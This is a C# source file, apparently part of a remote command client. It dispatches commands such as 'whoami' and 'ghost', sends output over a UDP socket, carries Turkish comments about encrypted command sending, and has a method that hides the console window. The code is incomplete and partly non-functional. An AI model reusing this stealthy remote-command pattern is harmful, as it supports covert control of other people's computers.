using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using Client.Data;
namespace Client.Shelter
{
    class ShelterHandler
    {
        List<Shelter> shelters;
        public ShelterHandler()
        {
            this.shelters = new List<Shelter>();
            this.shelters.Add(new BeepBlop("beep"));
            this.shelters.Add(new WhoAmI("whoami"));
            this.shelters.Add(new GhostOperator("ghost"));
        }

        public string RunShelter(string shelter)
        {
            
            string[] sp = shelter.Split(" ");
            
            string name = sp.First();
            string[] args = sp.Skip(1).ToArray();
            foreach (Shelter s in this.shelters)
            {
                if (s.name.ToLower() == name)
                  
                return s.exc(args);
            }
            return "Command " +shelter+ " does not exist";
        }

        public static void OutputShip(string comrade)
        {
            //Socket oluşturma ve lokal bazlı dinleme için gerekli tanımlamalar
            //ipv6 kullanılıyor

            //socket.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            //IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 14568); // lokal bazlı dinleme için 127.0.0.1, WAN bazlı dinleme için 0.0.0.0
            //Byte[] data = Encoding.ASCII.GetBytes(comrade.Ghoster()); // Aes ile şifreli bir şekilde komut gönderimi
            //socket.SendTo(data, iPEndPoint);
            Socket socket = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.IPv6Any, 0);
            EndPoint endPoint = iPEndPoint as EndPoint;
            Byte[] data = Encoding.ASCII.GetBytes(comrade);
            socket.SendTo(data, iPEndPoint);
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern Boolean ShowWindow(IntPtr hWnd, int nCmdShow);
        public void HideWindow()
        {
            ShowWindow(GetConsoleWindow(), 0);
        }
    }
}
